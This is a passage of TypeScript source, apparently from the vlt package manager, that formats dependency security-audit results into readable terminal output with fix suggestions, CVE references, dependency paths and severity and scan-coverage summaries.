      `reachable: ${via}, so \`vlt install\` picks up ${patched}`,
    ]
  }

  const names = blocked
    .map(d => `${d.name} declares ${d.range}`)
    .join(', ')
  return [
    blocked.length === ranged.length ?
      `blocked: ${names} -- the range must widen to reach ${patched}`
    : `partly blocked: ${names} -- those ranges must widen to reach ${patched}`,
  ]
}

/**
 * The actionable next step for a finding, limited to what the advisory
 * actually establishes.
 *
 * A direct dependency is declared in a manifest we control, so naming
 * the install command is safe -- pinned to the exact patched version
 * rather than `>=`, which would also permit an unrelated breaking
 * major.
 *
 * A transitive one is deliberately *not* given a command. Its version
 * is chosen by whatever depends on it, and we have not checked that a
 * release of that dependent exists whose range admits the patched
 * version; asserting "update <parent>" would be a guess. The paths are
 * reported instead, and the reader decides.
 */
const fixLine = (
  alert: PackageAlert,
  pkg: AuditPackage,
): string[] => {
  const lines: string[] = []

  // For impersonation alerts the remedy isn't a version at all -- the
  // feed names the package that was probably meant. Gated on the alert
  // type: attached to some other kind of alert this would otherwise
  // suppress that alert's real remedy and print a feed-chosen package
  // name as the recommended action.
  if (impersonationAlertTypes.has(alert.type)) {
    const alternate = safeText(alert.props?.alternatePackage, 128)
    if (alternate) lines.push(`did you mean ${alternate}?`)
  }

  const fixed = patchedVersion(alert)
  if (!fixed) {
    // The feed attaches a `fix` object only when a fix exists, so its
    // absence is an authoritative "nothing to upgrade to" rather than
    // something we have to infer -- but only say so for the
    // vulnerability category, where a patched release is the expected
    // remedy. A `network access` finding has no patch to wait for.
    //
    // fix.description is deliberately not rendered: it reads
    // "Run `npx socket fix --id ...`", i.e. it points at another
    // package manager's CLI.
    if (alert.category === 'vulnerability' && !alert.fix) {
      lines.push('fix: none available yet')
    }
    return lines
  }

  if (!pkg.direct) {
    lines.push(...reachabilityLine(pkg, fixed))
    return lines
  }

  // Only emit a copy-pasteable command when the name is a real package
  // name; otherwise report the version and let the reader act on it.
  lines.push(
    validPackageName.test(pkg.name) ?
      `fix: vlt install ${pkg.name}@${fixed}`
    : `fix: upgrade to ${fixed}`,
  )
  return lines
}

/**
 * Alert types where the finding is "this isn't the package you meant",
 * and `alternatePackage` names the one that was.
 */
const impersonationAlertTypes = new Set<string>([
  'didYouMean',
  'gptDidYouMean',
  'squatting',
  'troll',
])

/**
 * A header line per flagged package, most severe first, then one
 * indented line per distinct finding and finally the dependency path:
 *
 *     high  brace-expansion@1.1.16
 *             vulnerability: high  CVE-2026-14257  CWE-400
 *             vulnerability: high  CVE-2026-69152  CWE-770
 *             via @vltpkg/cli-sdk > minimatch > brace-expansion
 *
 * Identical findings are collapsed to one line with an `xN` count: a
 * package routinely carries the same alert many times over, and
 * repeating the line adds no information while pushing the useful
 * lines off screen.
 */
const formatAuditRows = (
  result: AuditResult,
  colors?: boolean,
): string[] => {
  const buckets = nonEmptySeverityBuckets(result)
  const severityWidth = Math.max(
    0,
    ...buckets.map(({ severity }) => severity.length),
  )
  const indent = ' '.repeat(severityWidth + 4)

  const lines: string[] = []
  for (const { severity, pkgs } of buckets) {
    for (const pkg of pkgs) {
      // one blank line between packages, so each finding reads as its
      // own block rather than one continuous wall of text
      if (lines.length > 0) lines.push('')
      lines.push(
        `${colorizeBySeverity(severity, severity.padEnd(severityWidth), colors)}  ${pkg.name}@${pkg.version}`,
      )

      // Keyed off `type`, not `category`: `category` is the coarse
      // grouping (every supply-chain finding is `supplyChainRisk`), so
      // grouping by it renders a package's distinct alerts as
      // identical lines that then collapse into a meaningless count.
      // `type` names the actual finding, and `alertLabel` turns it
      // into something readable.
      const findings = new Map<
        string,
        { count: number; advisory: string[] }
      >()
      for (const alert of pkg.alerts) {
        const detail = [
          // an unrecognized severity still shows what the feed said
          `${alertLabel(alert.type)}: ${asSeverityLevel(alert.severity) || safeText(alert.severity, 32) || 'unknown'}`,
          ...alertRefs(alert, colors),
        ].join('  ')
        const seen = findings.get(detail)
        if (seen) {
          seen.count++
        } else {
          findings.set(detail, {
            count: 1,
            advisory: [
              ...alertAdvisoryLines(alert),
              ...fixLine(alert, pkg),
            ],
          })
        }
      }
      for (const [detail, { count, advisory }] of findings) {
        lines.push(
          `${indent}${detail}${count > 1 ? ` x${count}` : ''}`,
        )
        for (const line of advisory) {
          lines.push(`${indent}  ${line}`)
        }
      }

      // CVE ids that came from insights.cve without a matching alert
      // would otherwise go unreported. Filter falsy ids so a sparse
      // insights.cve array can't render a bare comma.
      //
      // Keyed by plain `string`: alert ids are typed `CVE-${string}`
      // while `pkg.cves` is `string[]`, and the lookup below asks
      // whether an arbitrary id is one of the claimed ones.
      const claimed = new Set<string>(
        pkg.alerts.flatMap(alert =>
          alert.props?.cveId ? [alert.props.cveId] : [],
        ),
      )
      const unclaimed = pkg.cves.filter(
        cve => cve && !claimed.has(cve),
      )
      if (unclaimed.length > 0) {
        lines.push(
          `${indent}${unclaimed
            .map(cve => hyperlink(cve, nvdUrl(cve), colors))
            .join(', ')}`,
        )
      }

      // A single route is worth showing inline. Beyond that, report the
      // number rather than the routes: listing forty paths buries the
      // finding, and one arbitrary path would understate it, since
      // acting on that path alone leaves the flagged version installed
      // via all the others.
      const count = pkg.pathCount ?? 0
      if (count === 1 && pkg.path) {
        lines.push(`${indent}via ${safeText(pkg.path, 256)}`)
      } else if (count > 1) {
        lines.push(
          `${indent}reached by ${count}${pkg.pathCountTruncated ? '+' : ''} paths`,
        )
      }
    }
  }

  return lines
}

/**
 * Format the "N malware, N vulnerable, N squat" category breakdown
 * line, each count styled with its category color when `colors` is
 * true. Omits categories with zero alerts.
 */
const formatCategoryCountsLine = (
  result: AuditResult,
  colors?: boolean,
): string => {
  const counts = categoryCounts(result)
  const parts = (
    Object.entries(counts) as [keyof CategoryCounts, number][]
  )
    .filter(([, count]) => count > 0)
    .map(([category, count]) =>
      colorizeByCategory(category, `${count} ${category}`, colors),
    )
  return parts.length > 0 ? parts.join(', ') : 'no alerts'
}

/**
 * Format the "N critical, N high, ..." severity breakdown line, each
 * count styled with its severity color when `colors` is true.
 */
const formatSeverityCountsLine = (
  result: AuditResult,
  colors?: boolean,
): string =>
  nonEmptySeverityBuckets(result)
    .map(({ severity, pkgs }) =>
      colorizeBySeverity(
        severity,
        `${pkgs.length} ${severity}`,
        colors,
      ),
    )
    .join(', ')

/**
 * Format audit result as human-readable summary text.
 */
export const formatAuditSummary = (
  result: AuditResult,
  { colors }: { colors?: boolean } = {},
): string => {
  if (result.total === 0) {
    return '0 packages with security issues\n'
  }

  // Findings first, then the summary -- the counts are the conclusion
  // to read once the detail has scrolled past, and on a long report
  // they'd otherwise be lost off the top of the terminal.
  const lines: string[] = [...formatAuditRows(result, colors), '']

  lines.push(
    `${result.total} package${result.total === 1 ? '' : 's'} with security issues`,
  )
  lines.push(formatCategoryCountsLine(result, colors))
  lines.push(formatSeverityCountsLine(result, colors))

  // Active exploitation is the strongest prioritisation signal the feed
  // gives, and it is otherwise only a badge on one detail line, easily
  // scrolled past. Say it in the summary.
  const exploited = activelyExploitedCount(result)
  if (exploited > 0) {
    const text = `${exploited} actively exploited`
    lines.push(colors ? styleText(['red', 'bold'], text) : text)
  }

  lines.push('')
  lines.push(formatDependencyBreakdown(result))

  // Add scan coverage info if we have unscanned packages
  lines.push(...formatScanCoverage(result))

  return lines.join('\n')
}

/**
 * The "N of M installed versions scanned" coverage line.
 *
 * Reported whenever coverage is known, not only when something is
 * unscanned: "no issues found" means much less if a tenth of the tree
 * was never looked at, and the reader cannot tell the difference unless
 * the number is always there. Unscanned versions are called out
 * explicitly, because they are the part the findings say nothing about.
 */
const formatScanCoverage = (result: AuditResult): string[] => {
  const { scannedCount, unscannedCount } = result
  if (scannedCount === undefined || unscannedCount === undefined) {
    return []
  }
  const total = scannedCount + unscannedCount
  if (total === 0) return []
  const versions = total === 1 ? 'version' : 'versions'
  return [
    unscannedCount === 0 ?
      `${scannedCount} of ${total} installed ${versions} scanned`
    : `${scannedCount} of ${total} installed ${versions} scanned -- ${unscannedCount} unscanned, so findings may be incomplete`,
  ]
}
